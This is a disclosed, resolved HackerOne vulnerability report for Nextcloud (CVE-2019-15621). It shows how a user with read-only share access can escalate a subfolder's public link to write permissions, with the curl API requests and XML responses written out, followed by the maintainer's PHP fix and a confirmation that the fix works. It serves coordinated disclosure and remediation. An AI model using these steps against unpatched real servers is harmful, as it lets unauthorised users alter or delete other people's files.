{"id":619484,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MTk0ODQ=","url":"https://hackerone.com/reports/619484","title":"User with read-only access to a share can gain write access to sub-folders in the share","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2019-06-19T04:50:02.608Z","submitted_at":"2019-06-19T04:50:02.608Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"phil-davis","url":"/phil-davis","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13291,"url":"https://hackerone.com/nextcloud","handle":"nextcloud","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Nextcloud","twitter_handle":"nextclouders","website":"https://nextcloud.com","about":"Access, share and protect your files, calendars, contacts, communication \u0026 more at home and in your enterprise."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2019-15621"],"singular_disclosure_disabled":false,"disclosed_at":"2020-03-01T13:36:11.620Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2020-01-31T13:36:07.013Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"user0 creates folders /test and /test/sub\nuser0 creates file /test/sub/file.txt\nuser0 shares folder /test with user1 with read+share permissions (17)\nuser1 receives the folder /test and can read-download /test/sub/file.txt - good\nuser1 creates a link share of /test/sub - it has permissions 1 (read-only) - good\nuser1 uses the sharing API to escalate the permissions of the link share, e.g.\n```\ncurl --user user1:user1 \"http://172.17.0.1:8081/ocs/v1.php/apps/files_sharing/api/v1/shares/3\" -H \"OCS-APIRequest: true\"  -X PUT --data 'permissions=15'\n```\nNow browse to the link, e.g. my link was http://172.17.0.1:8081/index.php/s/t9dfm6K57yo6a9r\n\nFrom the link, anyone (in this case user1, who has knowledge of the link) can create/change/delete files.\ne.g. delete file.txt and then upload other files, or some different file.txt\n\nNow login as user0. \n\nuser0 sees that the content of /test/sub has been changed. But they only gave read and share permissions to user1. They never gave any create-change-delete permissions to anyone.\n\n## Impact\n\nA user who has shared some folder(s) read-only can have the content of sub-folders modified by a user who has received the read-only share.\n\nHere is a realistic use case where this public link share permissions bump will be a real issue:\n\n1) the organisation shares read-only a folder to almost everybody. In that folder are sub-folders that have files that have, for example, organisation policy documents (`Policy/Finance` `Policy/HR` etc folders)\n2) just 1 user `bob`'s password/authentication details are compromised, or `bob` is malicious himself\n3) the attacker `bob` makes a read-only public link share of each sub-folder\n4) the attacker `bob` increases the permissions of the public link share to read-write-delete\n5) the attacker `bob` browses to the public link share, deletes all the real policy documents and uploads different ones...\n\nNow everybody else in the organisation sees different documents in the (supposedly) read-only share.","bounty_amount":"250.0","formatted_bounty":"$250","weakness":{"id":75,"name":"Privilege Escalation"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-03-01T13:36:07.095Z","allow_singular_disclosure_after":-50895423.50025732,"singular_disclosure_allowed":true,"vote_count":16,"voters":["a_d_a_m","ali","cryptographer","itsmeakhil13","thedgtl","cyrilsiahi","ajmiller","mrppt","surfnturf","domaxi198","and 6 more..."],"severity":{"rating":"medium","score":4.8,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"high","privileges_required":"low","user_interaction":"required","scope":"unchanged","confidentiality":"high","integrity":"none","availability":"none"}},"structured_scope":{"databaseId":13,"asset_type":"SOURCE_CODE","asset_identifier":"nextcloud/server","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":5129785,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot for reporting this potential issue back to us!\n\nOur security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster. For obvious reasons we'd like to ask you to not disclose this issue to any other party.","automated_response":true,"created_at":"2019-06-19T04:50:02.945Z","updated_at":"2019-06-19T04:50:02.945Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Nextcloud"}},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5146159,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Which version of Nextcloud are you running?\n\nFor me it fails to increase the permissions:\n\n```\n$ curl --user test1:123456 \"http://localhost/ocs/v1.php/apps/files_sharing/api/v1/shares/3\" -H \"OCS-APIRequest: true\"  -X PUT --data 'permissions=15'\n\u003c?xml version=\"1.0\"?\u003e\n\u003cocs\u003e\n \u003cmeta\u003e\n  \u003cstatus\u003efailure\u003c/status\u003e\n  \u003cstatuscode\u003e404\u003c/statuscode\u003e\n  \u003cmessage\u003eCannot increase permissions\u003c/message\u003e\n  \u003ctotalitems\u003e\u003c/totalitems\u003e\n  \u003citemsperpage\u003e\u003c/itemsperpage\u003e\n \u003c/meta\u003e\n \u003cdata/\u003e\n\u003c/ocs\u003e\n```\n","automated_response":false,"created_at":"2019-06-20T13:53:35.349Z","updated_at":"2019-06-20T13:53:35.349Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5146191,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I just checked and this is the case since Feb. 2016\nhttps://github.com/nextcloud/server/commit/8924b0a0dca9b23c77d0d5ae915c58705d2dfcaf#diff-eee1d023548d25fa742d238b639aef03R608","automated_response":false,"created_at":"2019-06-20T13:57:24.202Z","updated_at":"2019-06-20T13:57:24.202Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5146192,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"","automated_response":false,"created_at":"2019-06-20T13:57:30.771Z","updated_at":"2019-06-20T13:57:30.771Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5154427,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"I did it on my own cloud that was running 15.04. But also I did it on a git clone of current server master.\nThe first steps I just did with the webUI - create user0 and user1, login to each to init them properly, share from user0 to user1 (and uncheck \"can edit\"). Then when logged in as user1, in the sharing tab for /test/sub, click the \"+\" for share link. It creates a public share link:\n```\ncurl --user user1:user1 \"http://172.17.0.1:8081/ocs/v1.php/apps/files_sharing/api/v1/shares\" -H \"OCS-APIRequest: true\"\n\u003c?xml version=\"1.0\"?\u003e\n\u003cocs\u003e\n \u003cmeta\u003e\n  \u003cstatus\u003eok\u003c/status\u003e\n  \u003cstatuscode\u003e100\u003c/statuscode\u003e\n  \u003cmessage\u003eOK\u003c/message\u003e\n  \u003ctotalitems\u003e\u003c/totalitems\u003e\n  \u003citemsperpage\u003e\u003c/itemsperpage\u003e\n \u003c/meta\u003e\n \u003cdata\u003e\n  \u003celement\u003e\n   \u003cid\u003e5\u003c/id\u003e\n   \u003cshare_type\u003e3\u003c/share_type\u003e\n   \u003cuid_owner\u003euser1\u003c/uid_owner\u003e\n   \u003cdisplayname_owner\u003euser1\u003c/displayname_owner\u003e\n   \u003cpermissions\u003e1\u003c/permissions\u003e\n   \u003cstime\u003e1561086510\u003c/stime\u003e\n   \u003cparent/\u003e\n   \u003cexpiration/\u003e\n   \u003ctoken\u003eJ6c5wkNe4gCBo5z\u003c/token\u003e\n   \u003cuid_file_owner\u003euser0\u003c/uid_file_owner\u003e\n   \u003cnote\u003e\u003c/note\u003e\n   \u003clabel\u003e\u003c/label\u003e\n   \u003cdisplayname_file_owner\u003euser0\u003c/displayname_file_owner\u003e\n   \u003cpath\u003e/test/sub\u003c/path\u003e\n   \u003citem_type\u003efolder\u003c/item_type\u003e\n   \u003cmimetype\u003ehttpd/unix-directory\u003c/mimetype\u003e\n   \u003cstorage_id\u003eshared::/test\u003c/storage_id\u003e\n   \u003cstorage\u003e5\u003c/storage\u003e\n   \u003citem_source\u003e141\u003c/item_source\u003e\n   \u003cfile_source\u003e141\u003c/file_source\u003e\n   \u003cfile_parent\u003e140\u003c/file_parent\u003e\n   \u003cfile_target\u003e/sub\u003c/file_target\u003e\n   \u003cshare_with/\u003e\n   \u003cshare_with_displayname/\u003e\n   \u003cpassword/\u003e\n   \u003csend_password_by_talk\u003e\u003c/send_password_by_talk\u003e\n   \u003curl\u003ehttp://172.17.0.1:8081/index.php/s/J6c5wkNe4gCBo5z\u003c/url\u003e\n   \u003cmail_send\u003e0\u003c/mail_send\u003e\n   \u003chide_download\u003e0\u003c/hide_download\u003e\n  \u003c/element\u003e\n \u003c/data\u003e\n\u003c/ocs\u003e\n```\nThen bump the permissions of that public share link:\n```\ncurl --user user1:user1 \"http://172.17.0.1:8081/ocs/v1.php/apps/files_sharing/api/v1/shares/5\" -H \"OCS-APIRequest: true\"  -X PUT --data 'permissions=15'\n\u003c?xml version=\"1.0\"?\u003e\n\u003cocs\u003e\n \u003cmeta\u003e\n  \u003cstatus\u003eok\u003c/status\u003e\n  \u003cstatuscode\u003e100\u003c/statuscode\u003e\n  \u003cmessage\u003eOK\u003c/message\u003e\n  \u003ctotalitems\u003e\u003c/totalitems\u003e\n  \u003citemsperpage\u003e\u003c/itemsperpage\u003e\n \u003c/meta\u003e\n \u003cdata\u003e\n  \u003cid\u003e5\u003c/id\u003e\n  \u003cshare_type\u003e3\u003c/share_type\u003e\n  \u003cuid_owner\u003euser1\u003c/uid_owner\u003e\n  \u003cdisplayname_owner\u003euser1\u003c/displayname_owner\u003e\n  \u003cpermissions\u003e15\u003c/permissions\u003e\n  \u003cstime\u003e1561086510\u003c/stime\u003e\n  \u003cparent/\u003e\n  \u003cexpiration/\u003e\n  \u003ctoken\u003eJ6c5wkNe4gCBo5z\u003c/token\u003e\n  \u003cuid_file_owner\u003euser0\u003c/uid_file_owner\u003e\n  \u003cnote\u003e\u003c/note\u003e\n  \u003clabel\u003e\u003c/label\u003e\n  \u003cdisplayname_file_owner\u003euser0\u003c/displayname_file_owner\u003e\n  \u003cpath\u003e/test/sub\u003c/path\u003e\n  \u003citem_type\u003efolder\u003c/item_type\u003e\n  \u003cmimetype\u003ehttpd/unix-directory\u003c/mimetype\u003e\n  \u003cstorage_id\u003eshared::/test\u003c/storage_id\u003e\n  \u003cstorage\u003e5\u003c/storage\u003e\n  \u003citem_source\u003e141\u003c/item_source\u003e\n  \u003cfile_source\u003e141\u003c/file_source\u003e\n  \u003cfile_parent\u003e140\u003c/file_parent\u003e\n  \u003cfile_target\u003e/sub\u003c/file_target\u003e\n  \u003cshare_with/\u003e\n  \u003cshare_with_displayname/\u003e\n  \u003cpassword/\u003e\n  \u003csend_password_by_talk\u003e\u003c/send_password_by_talk\u003e\n  \u003curl\u003ehttp://172.17.0.1:8081/index.php/s/J6c5wkNe4gCBo5z\u003c/url\u003e\n  \u003cmail_send\u003e0\u003c/mail_send\u003e\n  \u003chide_download\u003e0\u003c/hide_download\u003e\n \u003c/data\u003e\n\u003c/ocs\u003e\n```\nThen see that it really worked:\n```\ncurl --user user1:user1 \"http://172.17.0.1:8081/ocs/v1.php/apps/files_sharing/api/v1/shares\" -H \"OCS-APIRequest: true\"\n\u003c?xml version=\"1.0\"?\u003e\n\u003cocs\u003e\n \u003cmeta\u003e\n  \u003cstatus\u003eok\u003c/status\u003e\n  \u003cstatuscode\u003e100\u003c/statuscode\u003e\n  \u003cmessage\u003eOK\u003c/message\u003e\n  \u003ctotalitems\u003e\u003c/totalitems\u003e\n  \u003citemsperpage\u003e\u003c/itemsperpage\u003e\n \u003c/meta\u003e\n \u003cdata\u003e\n  \u003celement\u003e\n   \u003cid\u003e5\u003c/id\u003e\n   \u003cshare_type\u003e3\u003c/share_type\u003e\n   \u003cuid_owner\u003euser1\u003c/uid_owner\u003e\n   \u003cdisplayname_owner\u003euser1\u003c/displayname_owner\u003e\n   \u003cpermissions\u003e15\u003c/permissions\u003e\n   \u003cstime\u003e1561086510\u003c/stime\u003e\n   \u003cparent/\u003e\n   \u003cexpiration/\u003e\n   \u003ctoken\u003eJ6c5wkNe4gCBo5z\u003c/token\u003e\n   \u003cuid_file_owner\u003euser0\u003c/uid_file_owner\u003e\n   \u003cnote\u003e\u003c/note\u003e\n   \u003clabel\u003e\u003c/label\u003e\n   \u003cdisplayname_file_owner\u003euser0\u003c/displayname_file_owner\u003e\n   \u003cpath\u003e/test/sub\u003c/path\u003e\n   \u003citem_type\u003efolder\u003c/item_type\u003e\n   \u003cmimetype\u003ehttpd/unix-directory\u003c/mimetype\u003e\n   \u003cstorage_id\u003eshared::/test\u003c/storage_id\u003e\n   \u003cstorage\u003e5\u003c/storage\u003e\n   \u003citem_source\u003e141\u003c/item_source\u003e\n   \u003cfile_source\u003e141\u003c/file_source\u003e\n   \u003cfile_parent\u003e140\u003c/file_parent\u003e\n   \u003cfile_target\u003e/sub\u003c/file_target\u003e\n   \u003cshare_with/\u003e\n   \u003cshare_with_displayname/\u003e\n   \u003cpassword/\u003e\n   \u003csend_password_by_talk\u003e\u003c/send_password_by_talk\u003e\n   \u003curl\u003ehttp://172.17.0.1:8081/index.php/s/J6c5wkNe4gCBo5z\u003c/url\u003e\n   \u003cmail_send\u003e0\u003c/mail_send\u003e\n   \u003chide_download\u003e0\u003c/hide_download\u003e\n  \u003c/element\u003e\n \u003c/data\u003e\n\u003c/ocs\u003e\n```\nThen browse to that link http://172.17.0.1:8081/index.php/s/J6c5wkNe4gCBo5z\nFrom there I can create new folders, upload files, delete existing files... that really belong to user0\n\nThis problem is about \"public link shares\" of sub-folders of received shares.","automated_response":false,"created_at":"2019-06-21T03:18:20.947Z","updated_at":"2019-06-21T03:18:20.947Z","actor":{"username":"phil-davis","cleared":false,"url":"/phil-davis","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5154450,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I upgraded my own NextCloud to 16.0.1 and easily reproduced the issue there also.\n","automated_response":false,"created_at":"2019-06-21T03:31:51.487Z","updated_at":"2019-06-21T03:31:51.487Z","actor":{"username":"phil-davis","cleared":false,"url":"/phil-davis","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5155050,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ah, I tried to re-share the shared folder. But it works with a subfolder, okay.","automated_response":false,"created_at":"2019-06-21T07:04:46.495Z","updated_at":"2019-06-21T07:04:46.495Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5155185,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Can you check the following patch:\n\n```diff\ndiff --git a/apps/files_sharing/lib/Controller/ShareAPIController.php b/apps/files_sharing/lib/Controller/ShareAPIController.php\nindex a6ad70a7f4..66e39bb071 100644\n--- a/apps/files_sharing/lib/Controller/ShareAPIController.php\n+++ b/apps/files_sharing/lib/Controller/ShareAPIController.php\n@@ -975,10 +975,20 @@ class ShareAPIController extends OCSController {\n                }\n \n                if ($permissions !== null \u0026\u0026 $share-\u003egetShareOwner() !== $this-\u003ecurrentUser) {\n+\n+                       // Get the root mount point for the user and check the share permissions there\n+                       $userFolder = $this-\u003erootFolder-\u003egetUserFolder($this-\u003ecurrentUser);\n+                       $userNodes = $userFolder-\u003egetById($share-\u003egetNodeId());\n+                       $userNode = array_shift($userNodes);\n+\n+                       $userMountPointId = $userNode-\u003egetMountPoint()-\u003egetStorageRootId();\n+                       $userMountPoints = $userFolder-\u003egetById($userMountPointId);\n+                       $userMountPoint = array_shift($userMountPoints);\n+\n                        /* Check if this is an incoming share */\n-                       $incomingShares = $this-\u003eshareManager-\u003egetSharedWith($this-\u003ecurrentUser, Share::SHARE_TYPE_USER, $share-\u003egetNode(), -1, 0);\n-                       $incomingShares = array_merge($incomingShares, $this-\u003eshareManager-\u003egetSharedWith($this-\u003ecurrentUser, Share::SHARE_TYPE_GROUP, $share-\u003egetNode(), -1, 0));\n-                       $incomingShares = array_merge($incomingShares, $this-\u003eshareManager-\u003egetSharedWith($this-\u003ecurrentUser, Share::SHARE_TYPE_ROOM, $share-\u003egetNode(), -1, 0));\n+                       $incomingShares = $this-\u003eshareManager-\u003egetSharedWith($this-\u003ecurrentUser, Share::SHARE_TYPE_USER, $userMountPoint, -1, 0);\n+                       $incomingShares = array_merge($incomingShares, $this-\u003eshareManager-\u003egetSharedWith($this-\u003ecurrentUser, Share::SHARE_TYPE_GROUP, $userMountPoint, -1, 0));\n+                       $incomingShares = array_merge($incomingShares, $this-\u003eshareManager-\u003egetSharedWith($this-\u003ecurrentUser, Share::SHARE_TYPE_ROOM, $userMountPoint, -1, 0));\n \n                        /** @var \\OCP\\Share\\IShare[] $incomingShares */\n                        if (!empty($incomingShares)) {\n\n```","automated_response":false,"created_at":"2019-06-21T07:37:57.829Z","updated_at":"2019-06-21T07:37:57.829Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5155187,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2019-06-21T07:38:11.429Z","updated_at":"2019-06-21T07:38:11.429Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5161441,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It works:\n```\ncurl --user user1:user1 \"http://172.17.0.1:8081/ocs/v1.php/apps/files_sharing/api/v1/shares/7\" -H \"OCS-APIRequest: true\"  -X PUT --data 'permissions=15'\n\u003c?xml version=\"1.0\"?\u003e\n\u003cocs\u003e\n \u003cmeta\u003e\n  \u003cstatus\u003efailure\u003c/status\u003e\n  \u003cstatuscode\u003e404\u003c/statuscode\u003e\n  \u003cmessage\u003eCannot increase permissions\u003c/message\u003e\n  \u003ctotalitems\u003e\u003c/totalitems\u003e\n  \u003citemsperpage\u003e\u003c/itemsperpage\u003e\n \u003c/meta\u003e\n \u003cdata/\u003e\n\u003c/ocs\u003e\n```\nThe permissions have not been increased.\nI can only download from the link.","automated_response":false,"created_at":"2019-06-21T14:48:27.457Z","updated_at":"2019-06-21T14:48:27.457Z","actor":{"username":"phil-davis","cleared":false,"url":"/phil-davis","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5198343,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks a lot for your report again. This has been resolved in our latest maintenance releases and we're working on the advisories at the moment.\n\nPlease let us know how you'd like to be credited in our official advisory. We require the following information:\n\n- Name / Pseudonym\n- Email address (optional)\n- Website (optional)\n- Company (optional)\n","automated_response":false,"created_at":"2019-06-26T09:41:58.403Z","updated_at":"2019-06-26T09:41:58.403Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"phil-davis","url":"/phil-davis"},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5198352,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2019-06-26T09:43:51.491Z","updated_at":"2019-06-26T09:43:51.491Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Nextcloud"}},"bounty_amount":"250.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"nextcloud","collaborator":{"username":"phil-davis","url":"/phil-davis"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5199680,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It is fine for information to be public:\nPhil Davis\nphil@jankaritech.com\njankaritech.com\nJankariTech Pvt Ltd (Nepal)","automated_response":false,"created_at":"2019-06-26T13:46:52.217Z","updated_at":"2019-06-26T13:46:52.217Z","actor":{"username":"phil-davis","cleared":false,"url":"/phil-davis","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6932567,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-01-31T13:36:07.033Z","updated_at":"2020-01-31T13:36:07.033Z","first_to_agree":true,"actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6933057,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2020-01-31T14:51:27.398Z","updated_at":"2020-01-31T14:51:27.398Z","additional_data":{"old_severity":"High (7.3)","new_severity":"Medium (4.8)","old_severity_id":433005,"new_severity_id":622369},"actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7188459,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-03-01T13:36:11.641Z","updated_at":"2020-03-01T13:36:11.641Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Nextcloud"}},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}